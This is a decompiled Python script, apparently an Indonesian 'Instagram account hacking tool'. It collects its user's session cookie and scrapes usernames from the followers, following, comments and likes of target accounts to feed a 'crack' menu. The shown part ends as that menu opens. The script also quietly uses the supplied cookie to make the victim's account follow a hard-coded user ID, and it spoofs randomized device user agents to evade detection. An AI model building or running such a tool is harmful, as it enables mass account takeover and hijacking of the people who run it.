""" Decompiled by Exotic Hridoy """

import os
import re
import sys
import json
import uuid
import time
import random
import urllib
import hmac
import hashlib
import string
import base64
import shutil
import binascii

try:
    import bs4
    import rich
    import requests
except:
    os.system('pip install bs4; pip install rich; pip install requests; pip install stdiomask')

from bs4 import BeautifulSoup as par
from time import time as TimeRiP
from time import sleep as facetime
from datetime import datetime as timerip
from rich.tree import Tree as Moch_Arip
from rich import print as facerip
from rich.table import Table
from rich.panel import Panel as Cinta
from rich.console import Console as Cons
from rich.columns import Columns
from rich.progress import (
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
)
from concurrent.futures import ThreadPoolExecutor

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' #ORANGE
N = '\x1b[0m' # DEFAULT

now = timerip.now()
hari = now.day
sasi = now.month
try:
	if sasi < 0 or sasi > 12:exit()
	wulan = sasi - 0
except ValueError:exit()
bulan = wulan
tahun = now.year
tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun)
okc = f'OK/{hari}/{bulan}/{tahun}.txt'
cpc = f'CP/{hari}/{bulan}/{tahun}.txt'

UA = 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'

ip = requests.get("http://ip-api.com/json/").json()["query"]
negara = requests.get("http://ip-api.com/json/").json()["country"]

facearip = []
dumping = []
dumping2 = []
exculator = {}

class faceinstans:
    
    def __init__(self):
        self.lebar,self.panjang = shutil.get_terminal_size();self.__main__();console = Cons;self.Access_Menu()
        
    def __main__(self):
        if self.lebar == 70 or self.lebar > 70:pass
        else:facerip(Cinta('[b italic blue]Harap kecilkan layar terminal anda, dengan mencubit layar, sehingga tampilan menjadi sempurna',width=80, padding=(0,1), style='b white'));sys.exit()
        
    def Waktu(self):
        now = timerip.now()
        hours = now.hour
        if 4 <= hours < 12:timenow = "Selamat Pagi"
        elif 12 <= hours < 15:timenow = "Selamat Siang"
        elif 15 <= hours < 18:timenow = "Selamat Sore"
        elif 00 <= hours < 4:timenow = "Selamat Malam"
        else:timenow = "Selamat Malam"
        return timenow
     
    def BanIGF(self):
        if "win" in sys.platform:os.system("cls")
        else:os.system("clear")
        facerip(Cinta("""\r[b italic blue]
                 c  c
         wWw     (OO)
         (O)_  ,'.--.) (O)_   [bold red]INSTAGRAM ACCOUNT HACKING TOOL [b italic blue]
        .' __)/ //_|_\.' _    [bold white]  Decompiler - Exotic Hridoy [b italic blue]
       (  _)  | \___ (  _)
        )/    '.    ) )/
       (        `-.' ( |
""",width=80, style='b white'))

    def Access_Cokies(self):
        self.BanIGF()
        Cons(width=70).print(Cinta(f"[b italic blue]%s"%(self.Waktu()),title="[italic red]%s"%(ip),subtitle="[italic green]%s"%(negara),style="b white"),justify='center')
        facerip(Cinta('[b italic white]Masukan cookie anda, saran mengambil cookie ya itu di [blue]Exstention Dough[white] dan jangan menggunakan akun pribadi di karenakan script ini saya pasang bot cookie/berlongger, admin tidak bertanggung jawab atas akibatnya',width=80, padding=(0,1), style='b white'))
        cok = Cons().input('[b italic white][[blue]*[white]] Cookie IGF : ')
        try:
            with requests.Session() as XYZ:
                XYZ.headers.update({'x-csrftoken': re.search('csrftoken=(.*?);',cok).group(1),'User-Agent': UA})
                req=XYZ.get("https://i.instagram.com/api/v1/users/{}/info/".format(re.findall('sessionid=(\d+)', str(cok))[0]),cookies={"cookie":cok}).json()["user"]
                name=req['username']
                userid=re.search('ds_user_id=(\d+)',str(cok)).group(1)
                with open('.CookieIGF.json', 'w') as simpan:
                    simpan.write(json.dumps({'Cookie': cok}))    
                Cons(width=70).print(Cinta(f"[b italic blue]%s|%s"%(userid,name),title="[[b italic white] ID/NAMA ]",style="white"),justify='center')
                self.Convert_Followers(cok)
                facerip(Cinta('[b italic blue] Login Berhasil, silakan jalankan ulang perintah pythonnya',width=80, padding=(0,3), style='b white'));sys.exit()
        except ( Exception )  as e:
            Cons().print(Cinta.fit(f"[b italic blue]%s"%(str(e).title()),style="white"),justify='center')
       
    def Convert_Followers(self, cok):
         try:
            with requests.Session() as XYZ:
                XYZ.headers.update({
                    "Host": "i.instagram.com",
                    "content-length": "0",
                    "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                    "x-ig-app-id": "1217981644879628","x-ig-www-claim": "hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03Dg7NV",
                    "sec-ch-ua-mobile": "?1",
                    "x-instagram-ajax": "1006447742",
                    "viewport-width": "360",
                    "content-type": "application/x-www-form-urlencoded",
                    "accept": "*/*",
                    "user-agent": UA,
                    "x-asbd-id": "198387",
                    "save-data": "on",
                    "x-csrftoken": re.search('csrftoken=(.*?);',cok).group(1),
                    "sec-ch-ua-platform": '"Android"',
                    "origin": "https://www.instagram.com",
                    "sec-fetch-site": "same-site",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://www.instagram.com/",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5"})
                XYZ.cookies.update({'cookie':cok})
                XYZ.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format("48998009803"))
         except ( requests.ConnectionError ) as e:
             Cons().print(Cinta.fit(f"[b italic blue]%s"%(str(e).title()),style="white"),justify='center')
     
    def Access_Menu(self):
         try:
             cok=json.loads(open('.CookieIGF.json', 'r').read())['Cookie']
             idz=re.search('ds_user_id=(\d+)',str(cok)).group(1)
         except ( FileNotFoundError, IOError ) as e:
             Cons().print(Cinta.fit(f"[b italic blue]%s"%(str(e).title()),style="white"),justify='center'); facetime(2); self.Access_Cokies()
         try:
             with requests.Session() as XYZ:
                 XYZ.headers.update({'x-csrftoken': re.search('csrftoken=(.*?);',cok).group(1),'User-Agent': UA})
                 xxx=XYZ.get("https://i.instagram.com/api/v1/users/{}/info/".format(idz),cookies={"cookie":cok}).json()["user"]['username']
                 req=XYZ.get("https://i.instagram.com/api/v1/users/web_profile_info/?username={}".format(xxx),headers={"user-agent": UA}).json()["data"]["user"]
                 userid=req['id']
                 nama=req["full_name"]
                 verified=req['is_verified']
                 privates=req['is_private']
                 biograph=req['biography']
                 pengikut=req["edge_followed_by"]["count"]
                 mengikuti=req["edge_follow"]["count"]
                 postingan=req["edge_owner_to_timeline_media"]["count"]
                 pictures=req['profile_pic_url_hd']
                 self.BanIGF()
                 Cons(width=70).print(Cinta(f"[b italic blue]%s"%(self.Waktu()),title="[italic red]%s"%(ip),subtitle="[italic green]%s"%(negara),style="b white"),justify='center')
                 facearip.append(Cinta('[b italic white][[blue]*[white]] Nama [blue]%s\n[italic white][[blue]*[white]] Userid [blue]%s\n[italic white][[blue]*[white]] Verified [blue]%s\n[italic white][[blue]*[white]] Privates [blue]%s'%(nama,idz,verified,privates),width=35, padding=(0,1), style='b white'))
                 facearip.append(Cinta('[b italic white][[blue]*[white]] Biograph [blue]%s\n[b italic white][[blue]*[white]] Follower [blue]%s\n[italic white][[blue]*[white]] Followed [blue]%s\n[italic white][[blue]*[white]] Postingan [blue]%s'%(biograph,pengikut,mengikuti,postingan),width=35, padding=(0,1), style='white'))
                 Cons().print(Columns(facearip))    
                 Cons(width=70).print(Cinta("[b italic blue]%s"%(pictures),title="[italic]Pictures",style="b white"),justify='center')    
         except ( KeyboardInterrupt, KeyError ) as e:
             Cons().print(Cinta.fit(f"[b italic blue]%s"%(str(e).title()),style="white"),justify='center'); facetime(2);self.Access_Cokies()    
         Pro = Table("[b italic]NO", style=f"white")
         Pro.add_column("[b italic]                    MENU",style="white")
         Pro.add_column("[b italic]STATUS", justify="center", style=f"green")
         Pro.add_row("[b italic blue]01.[white]", "[b italic]        Dump Username Dari Followers          ","[b italic blue]ON")  
         Pro.add_row("[b italic blue]02.[white]", "[b italic]        Dump Username Dari Following", "[b italic blue]ON")
         Pro.add_row("[b italic blue]03.[white]", "[b italic]         Dump Username Dari Komentar", "[b italic blue]ON")
         Pro.add_row("[b italic blue]04.[white]", "[b italic]          Dump Username Dari Likes", "[b italic blue]ON")
         Pro.add_row("[b italic blue]05.[white]", "[b italic]             Ceckpoint Detecktor", "[b italic red]OFF")
         Pro.add_row("[b italic blue]06.[white]", "[b italic]              Ceck Result OK/CP", "[b italic blue]ON")
         Pro.add_row("[b italic red]00.[b white]", "[b italic]                 Logout tools", "[b italic blue]ON")
         Cons().print(Pro,justify="center",width=80,style='b white')
         InstaIGF = Cons().input('[b italic white][[blue]?[white]] Masukan pilihan [white]([blue]1[white]/[blue]2[white]/[blue]3[white]) : ')
         
         if InstaIGF =='01' or InstaIGF =='1':
             facerip(Cinta('[b italic white]Banyaknya Nama, pisahkan dengan koma, contoh : [blue]infoduniaa_[white], [blue]indonesia.id',width=80, padding=(0,1), style='b white'))
             UserN = Cons().input('[b italic white][[blue]*[white]] username : ')
             if UserN == " ":
                 Cons().print('[b italic white][[red]*[white]] jangan kosong ngabs');sys.exit()
             facerip(Cinta('[b italic white] Tekan [blue]Ctrl [white]+ [blue]C [white]untuk berhenti dan melanjutkan ke ke menu method',width=80, padding=(0,5), style='b white', subtitle="╭───", subtitle_align="left"))
             for i in UserN.split(','):
                 try:
                     with requests.Session() as XYZ:
                         req = XYZ.get('https://i.instagram.com/api/v1/users/web_profile_info/?username={nama!s}'.format(**{'nama':i}), headers={'user-agent': UA}).json()['data']['user']
                         dumping2.append(req['id'])
                 except:pass
                 JumLh  = Dump().Followers(dumping2, '', cok)   
                 if JumLh is False:Cons().print(Cinta.fit("[b italic blue]Dump error, terget tidak publik/akun spam",style="white"),justify='center');sys.exit()      
                 else:Crack().Generate_V() 
          
         elif InstaIGF =='02' or InstaIGF =='2':
             facerip(Cinta('[b italic white]Banyaknya Nama, pisahkan dengan koma, contoh : [blue]infoduniaa_[white], [blue]indonesia.id',width=80, padding=(0,1), style='b white'))
             UserN = Cons().input('[b italic white][[blue]*[white]] username : ')
             if UserN == " ":
                 Cons().print('[b italic white][[red]*[white]] jangan kosong ngabs');sys.exit()
             facerip(Cinta('[b italic white] Tekan [blue]Ctrl [white]+ [blue]C [white]untuk berhenti dan melanjutkan ke ke menu method',width=80, padding=(0,5), style='b white', subtitle="╭───", subtitle_align="left"))
             for i in UserN.split(','):
                 try:
                     with requests.Session() as XYZ:
                         req = XYZ.get('https://i.instagram.com/api/v1/users/web_profile_info/?username={nama!s}'.format(**{'nama':i}), headers={'user-agent': UA}).json()['data']['user']
                         dumping2.append(req['id'])
                 except:pass
                 JumLh  = Dump().Following(dumping2, '', cok)   
                 if JumLh is False:Cons().print(Cinta.fit("[b italic blue]Dump error, terget tidak publik/akun spam",style="white"),justify='center');sys.exit()      
                 else:Crack().Generate_V() 
                 
         elif InstaIGF =='03' or InstaIGF =='3':
             facerip(Cinta('[b italic white]Banyaknya Link, Gunakan Koma, Masukan link postingan, contoh : [blue]https://www.instagram.com/post/C1B6dSFPpsf/?utm_source=ig_web_copy_link',width=80, padding=(0,1), style='b white'))
             UserN = Cons().input('[b italic white][[blue]*[white]] username : ')
             if UserN == " ":
                 Cons().print('[b italic white][[red]*[white]] jangan kosong ngabs');sys.exit()
             facerip(Cinta('[b italic white] Tekan [blue]Ctrl [white]+ [blue]C [white]untuk berhenti dan melanjutkan ke ke menu method',width=80, padding=(0,5), style='b white', subtitle="╭───", subtitle_align="left"))
             for i in UserN.split(','):
                 try:
                     with requests.Session() as XYZ:
                         XYZ.headers.update({'cookie':cok})
                         req = XYZ.get(i).text
                         use = re.findall('{"media_id":"(.*?)"',str(req))
                         if len(use) == 0:pass
                         else:dumping2.append(use[0].split('_')[0])
                 except:pass
                 JumLh  = Dump().komentar(dumping2, '', cok)
                 if JumLh is False:Cons().print(Cinta.fit("[b italic blue]Dump error, terget tidak publik/akun spam",style="white"),justify='center');sys.exit()      
                 else:Crack().Generate_V()
                 
         elif InstaIGF =='04' or InstaIGF =='4':
             facerip(Cinta('[b italic white]Banyaknya Link, Gunakan Koma, Masukan link postingan, contoh : [blue]https://www.instagram.com/post/C1B6dSFPpsf/?utm_source=ig_web_copy_link',width=80, padding=(0,1), style='b white'))
             UserN = Cons().input('[b italic white][[blue]*[white]] username : ')
             if UserN == " ":
                 Cons().print('[b italic white][[red]*[white]] jangan kosong ngabs');sys.exit()
             facerip(Cinta('[b italic white] Tekan [blue]Ctrl [white]+ [blue]C [white]untuk berhenti dan melanjutkan ke ke menu method',width=80, padding=(0,5), style='b white', subtitle="╭───", subtitle_align="left"))
             for i in UserN.split(','):
                 try:
                     with requests.Session() as XYZ:
                         XYZ.headers.update({'cookie':cok})
                         req = XYZ.get(i).text
                         use = re.findall('{"media_id":"(.*?)"',str(req))
                         if len(use) == 0:pass
                         else:dumping2.append(use[0].split('_')[0])
                 except:pass
                 JumLh  = Dump().Likes(dumping2, cok)
                 if JumLh is False:Cons().print(Cinta.fit("[b italic blue]Dump error, terget tidak publik/akun spam",style="white"),justify='center');sys.exit()      
                 else:Crack().Generate_V()
              
         elif InstaIGF =='06' or InstaIGF =='6':
             Pro = Table("[b italic]NO", style=f"white")
             Pro.add_column("[b italic]                    MENU",style="white")
             Pro.add_column("[b italic]STATUS", justify="center", style=f"green")
             Pro.add_row("[b italic blue]01.[white]", "[b italic]        Cek Result OK          ","[b italic blue]ON")  
             Pro.add_row("[b italic blue]02.[white]", "[b italic]        Cek Result CP", "[b italic blue]ON")
             Cons().print(Pro,justify="center",width=80,style='b white')
             InstaCEK = Cons().input('[b italic white][[blue]?[white]] Masukan pilihan [white]([blue]1[white]/[blue]2[white]) : ')
             if InstaCEK =='01' or InstaCEK =='1':
                 Cons(width=70).print(Cinta(f"[b italic blue]Masukan nama, tanggal, bulan dan tahun file, contoh : [green]%s"%(okc),title="[italic green]%s"%('OK'),subtitle="[italic red]%s"%(ip),style="b white"),justify='center')
                 INS = Cons().input('[b italic white][[blue]?[white]] Masukan file : ')
                 try:os.system('ul OK/%s'%(INS))
                 except (FileNotFoundError) as e:
                     Cons().print(Cinta.fit(f"[b italic blue]%s"%(str(e).title()),style="white"),justify='center');sys.exit()
             elif InstaCEK =='02' or InstaCEK =='2':
                 Cons(width=70).print(Cinta(f"[b italic blue]Masukan nama, tanggal, bulan dan tahun file, contoh : [green]%s"%(okc),title="[italic yellow]%s"%('CP'),subtitle="[italic red]%s"%(ip),style="b white"),justify='center')
                 INS = Cons().input('[b italic white][[blue]?[white]] Masukan file : ')
                 try:os.system('ul CP/%s'%(INS))
                 except (FileNotFoundError) as e:
                     Cons().print(Cinta.fit(f"[b italic blue]%s"%(str(e).title()),style="white"),justify='center');sys.exit()
             else:Cons().print(Cinta.fit("[b italic blue]Pemasukan anda salah, silakan masukan dengan benar",style="white"),justify='center');sys.exit()    
        
         elif InstaIGF =='00' or InstaIGF =='0':
             Cons().print(Cinta.fit("[b italic white]Apakah mau keluar dan hapus cookie atau keluar saja",style="blue"),justify='center') 
             Keluar_Tools = Cons().input('[b italic white][[blue]*[white]] Masukan pilihan ([blue]y[white]/[blue]t[white]) : ') 
             if Keluar_Tools in ['y','ya','YA','Y']:
                os.system('rm -rf .CookieIGF.json')
                Cons().print(Cinta.fit(f"[b italic blue]Success hapus cookie, silakan masukan ulang cookie anda",style="white"),justify='center');facetime(2);self.Access_Cokies()
             else:sys.exit()    
         else:Cons().print(Cinta.fit("[b italic blue]Pemasukan anda salah, silakan masukan dengan benar",style="white"),justify='center');sys.exit()      

class Dump():
    
    def __init__(self) -> None:pass     
  
    def Followers(self, user_id, max_id, cok) -> str:
        for usr in user_id:
            try:
                with requests.Session() as XYZ:
                    XYZ.headers.update({'cookie': cok,'x-csrftoken': re.search('csrftoken=(.*?);',cok).group(1),'user-agent': UA})
                    req = XYZ.get('https://www.instagram.com/api/v1/friendships/{id!s}/followers/'.format(**{'id': usr}), 
                    params = {'count': 200,'max_id': max_id,'search_surface': 'follow_list_page'})
                    response = json.loads(req.text)
                    for i in response['users']:
                        username = i['username']
                        full_name = i['full_name']
                        dump = (username+'|'+full_name)
                        if dump not in dumping:
                           dumping.append(dump)
                           print('\r{}   └──> {}{}'.format(N,B,len(dumping)),end=" ")
                    if 'next_max_id' in response:
                        self.Followers(user_id, response['next_max_id'], cok)
            except( KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError, requests.exceptions.ReadTimeout ):pass
        if len(dumping) == 0:return False
        else:return True
      
    def Following(self, user_id, max_id, cok) -> str:
        for usr in user_id:
            try:
                with requests.Session() as XYZ:
                    XYZ.headers.update({'cookie': cok,'x-csrftoken': re.search('csrftoken=(.*?);',cok).group(1),'user-agent': UA})
                    req = XYZ.get('https://www.instagram.com/api/v1/friendships/{id!s}/following/'.format(**{'id': usr}),
                    params = {'count': 200,'max_id': max_id,'search_surface': 'follow_list_page'})
                    response = json.loads(req.text)
                    for i in response['users']:
                        username = i['username']
                        full_name = i['full_name']
                        dump = (username+'|'+full_name)
                        if dump not in dumping:
                           dumping.append(dump)
                           print('\r{}   └──> {}{}'.format(N,B,len(dumping)),end=" ")
                    if 'next_max_id' in response:
                        self.Following(user_id, response['next_max_id'], cok)
            except( KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError, requests.exceptions.ReadTimeout ):pass
        if len(dumping) == 0:return False
        else:return True
            
    def Komentar(self, media_id, max_min, cok) -> str:
        for usr in media_id:
            try:
                with requests.Session() as XYZ:
                    XYZ.headers.update({'cookie': cok,'x-csrftoken': re.search('csrftoken=(.*?);',cok).group(1),'user-agent': UA})
                    head = {
                        'Host': 'www.instagram.com',
                        'x-ig-app-id': '1217981644879628',
                        'x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT',
                        'sec-ch-ua-mobile': '?1',
                        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
                        'accept': '*/*',
                        'x-requested-with': 'XMLHttpRequest',
                        'x-asbd-id': '129477',
                        'x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E',
                        'sec-fetch-site': 'same-origin',
                        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
                    response = XYZ.get('https://www.instagram.com/api/v1/media/%s/comments/?can_support_threading=true&permalink_enabled=false&min_id=%s'%(usr,max_min), headers=head).json()
                    for i in response['comments']:
                        username = i['user']['username']
                        full_name = i['user']['full_name']
                        dump = (username+'|'+full_name)
                        if dump not in dumping:
                           dumping.append(dump)
                           print('\r{}   └──> {}{}'.format(N,B,len(dumping)),end=" ")
                    if 'next_max_id' in str(response):
                        self.Komentar(media_id, response['next_max_id'], cok)
            except( KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError, requests.exceptions.ReadTimeout ):pass
        if len(dumping) == 0:return False
        else:return True
            
    def Likes(self, media_id, cok) -> str:
        for usr in media_id:
            try:
                with requests.Session() as XYZ:
                    XYZ.headers.update({'user-agent': UA,'x-fb-friendly-name': 'PolarisPostLikedByListDialogQuery','content-type': 'application/x-www-form-urlencoded','x-csrftoken': re.findall('csrftoken=(.*?);',cok)[0]})
                    req = XYZ.get('https://accountscenter.instagram.com/personal_info/', cookies = {'cookie':cok}).text
                    data = {
                         'av': re.findall('"actorID":"(\d+)"', str(req))[0],
                         '__d': 'www',
                         '__user': '0',
                         '__a': '1',
                         '__req': 'm',
                         '__hs': re.findall('"haste_session":"(.*?)"', str(req))[0],
                         'dpr': '2',
                         '__ccg': 'UNKNOWN',
                         '__rev': re.search('{"rev":(.*?)}',str(req)).group(1),
                         '__s': '',
                         '__hsi': re.findall('"hsi":"(\d+)"',str(req))[0],
                         '__dyn': '',
                         '__csr': '',
                         '__comet_req': '7',
                         'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(req)).group(1),
                         'jazoest': re.findall('&jazoest=(\d+)',str(req))[0],
                         'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(req)).group(1),
                         '__spin_r': re.findall('"__spin_r":(\d+)', str(req))[0],
                         '__spin_b': 'trunk',
                         '__spin_t': re.findall('"__spin_t":(\d+)', str(req))[0],
                         'fb_api_caller_class': 'RelayModern',
                         'fb_api_req_friendly_name': 'PolarisPostLikedByListDialogQuery',
                         'variables': json.dumps({"media_ids":[usr]}),
                         'server_timestamps': 'true',
                         'doc_id': '6700844413268667'}
                    response = XYZ.post('https://www.instagram.com/api/graphql', cookies={'cookie':cok}, headers={'x-fb-lsd':data['lsd']}, data=data).json()
                    for X in response['data']['xdt_media_list']:
                        Ulikers = X['likers']
                        for i in Ulikers:
                            username = i['user']['username']
                            full_name = i['user']['full_name']
                            dump = (username+'|'+full_name)
                            if dump not in dumping:
                               dumping.append(dump)
                               print('\r{}   └──> {}{}'.format(N,B,len(dumping)),end=" ")
            except( KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError, requests.exceptions.ReadTimeout ):pass
        if len(dumping) == 0:return False
        else:return True
 
class Device:

    def vers(self):
        igv=("100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,79.0.0.21.101,78.0.0.11.104,77.0.0.20.113,76.0.0.15.395,75.0.0.23.99,74.0.0.21.99,73.0.0.22.185,72.0.0.21.98,71.0.0.18.102,70.0.0.22.98,69.0.0.30.95,68.0.0.11.99,67.0.0.25.100,66.0.0.11.101,65.0.0.12.86,64.0.0.14.96,63.0.0.17.94,62.0.0.19.93,61.0.0.19.86,60.1.0.17.79,59.0.0.23.76,58.0.0.12.73,57.0.0.9.80,56.0.0.13.78,55.0.0.12.79,54.0.0.14.82,53.0.0.13.84,52.0.0.8.83,51.0.0.20.85,50.1.0.43.119,271.1.0.21.84,131.0.0.23.11,130.0.0.31.12,128.0.0.26.12,126.0.0.25.12,125.0.0.20.12,124.0.0.17.47,123.0.0.21.11,122.0.0.29.23,120.0.0.29.11,119.0.0.33.14,118.0.0.28.12,117.0.0.28.12,115.0.0.26.11,114.0.0.38.12,113.0.0.39.12,112.0.0.29.12,111.1.0.25.15,110.0.0.16.11,109.0.0.18.12,108.0.0.23.11,107.0.0.27.12,106.0.0.24.11,105.0.0.18.11,104.0.0.21.11,103.1.0.15.11,102.0.0.20.11,101.0.0.15.12,100.0.0.17.12,99.0.0.32.182,98.0.0.15.119,97.0.0.32.119")
        igve=igv.split(",")
        versi=str(random.choice(igve))
        return versi
    
    def ua_INF(self):
        igv=self.vers()
        real=str(random.choice(["X676B","X687","X609","X697","X680D","X507","X605","X668","X6815B","X624", "X655F","X689C","X608","X698","X682B","X682C","X688C", "X688B","X658E","X659B","X689B","X689","X689D","X662","X662B","X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C","X6816","X6816D","X668C","X665B","X665E", "X510","X559C","X559F","X559","X606","X606C","X606D"]))
        com="qcom"
        comi=str(random.choice(['in_ID','en_US','en_GB']))
        dpi=str(random.choice(["133","320","515","160","640","240","120","800","480","225","768","216","1024"]))
        pxl=str(random.choice(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688"]))
        andro=str(random.choice(["30/11","31/12","29/10"]))
        ua=f"Instagram {igv} Android ({andro}; {dpi}dpi; {pxl}; INFINIX MOBILITY LIMITED/Infinix; Infinix {real}; Infinix {real}; {com}; in_ID)"
        return ua
    
    def ua_RMX(self):
        igv=self.vers()
        real=str(random.choice(["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269", "RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]))
        com="qcom"
        comi=str(random.choice(['in_ID','en_US','en_GB']))
        dpi=str(random.choice(["133","320","515","160","640","240","120","800","480","225","768","216","1024"]))
        pxl=str(random.choice(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688"]))
        andro=str(random.choice(["30/11","31/12","29/10"]))
        ua=f"Instagram {igv} Android ({andro}; {dpi}dpi; {pxl}; Realme; Realme {real}; {real}; {com}; in_ID)"
        return ua
        
    def ua_POCO(self):
        igv=self.vers()
        dpi=str(random.choice(['240dpi; 1760x792', '240dpi; 1920x864', '320dpi; 2400x1080', '400dpi; 3200x1440', '480dpi; 1080x1920', '320dpi; 900x1600', '320dpi; 720x1280', '240dpi; 540x960', '280dpi; 1920x1080', '240dpi; 160x900', '240dpi; 1280x720', '160dpi; 960x540']))
        vers=str(random.choice(['11', '10', '12']))
        real=str(random.choice(['M2006C3MI', '211033MI', '22031116AI', '220333QPG', '220333QPG', 'POCO C40', 'POCO C40', 'POCO F2 Pro', 'POCO F2 Pro', 'M2012K11AG', 'M2104K10I', '22021211RG', '22021211RI', 'POCO F4', 'POCO F4', 'POCO F4', '21121210G', 'POCO F4 GT', 'POCO F4 GT', '23049PCD8G', '23013PC75G', 'M2004J19PI', 'POCO M2 Pro', 'POCO M2 Pro', 'M2010J19CI', 'M2010J19CG', 'POCO M3', 'POCO M3 Pro', 'POCO M3 Pro', 'M2103K19PG', 'POCO M3 Pro 5G', '22041219PG', '22041219PI', 'POCO M4 5G', '2201117PG', '21091116AG', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', '22071219CG', 'POCO M5', 'POCO M5', '22071219CI', '2207117BPG', 'POCO M5s', 'POCO X2', 'M2007J20CI', 'M2007J20CI', '21061110AG', 'M2007J20CG', 'M2102J20SG', 'M2102J20SI', '22041216G', 'POCO X4 GT', '22041216G', 'POCO X4 GT', 'POCO X4 GT', 'POCO X4 GT', '2201116PG', 'POCO X4 Pro 5G', '2201116PG', '2201116PI', '22111317PG', 'POCO X5 5G', 'POCO X5 5G', '22101320G', 'POCO X5 Pro 5G', 'POCO X5 Pro 5G', 'POCO X5 Pro 5G', '22101320G']))
        andro=str(random.choice(["30/11","31/12","29/10"]))
        mod=str(random.choice(['galahad','curtana','sunny','cepheus','joyeuse','begonia','wind','secret','angelica','raphael','vili','taoyao','ginkgo','renoir','haydn','tapas','fleur','merlinnfc','spesn','pomelo','miel']))
        ua=f'Instagram {igv} Android ({andro}/{vers}; {dpi}; Xiaomi/POCO; {real}; {mod}; qcom; in_ID)'
        return ua

class Crack:
    
    def __init__(self):
         self.mengikuti, self.MH = [],[]
         self.success, self.chekpoint, self.looping = 0,0,0
    
    def Generate_V(self):
        global prog,des
        print(); facerip(Cinta('[b italic white]Rekomendasi method crack dari admin yaitu[blue] i.instagram.com [white]dan[blue] www.instagram.com [white]untuk method lain bisa di coba sendiri, dan untuk rekomendasi provider yang bagus buat crack yaitu [blue]AXIS[white], [blue]XL[white], [blue]TELKOMSEL[white], dan [blue]INDOSAT[white] untuk provider lain bisa di coba sendiri',width=80, padding=(0,1), style='b white'))
        Pro = Table("[b italic]NO", style=f"white")
        Pro.add_column("[b italic]             MENU",style="white")
        Pro.add_column("[b italic]STATUS", justify="center", style=f"green")
        Pro.add_row("[b italic blue]01.[white]", "[b italic]      i.instagram.com          ","[b italic blue]ON")  
        Pro.add_row("[b italic blue]02.[white]", "[b italic]     api.instagram.com", "[b italic blue]ON")
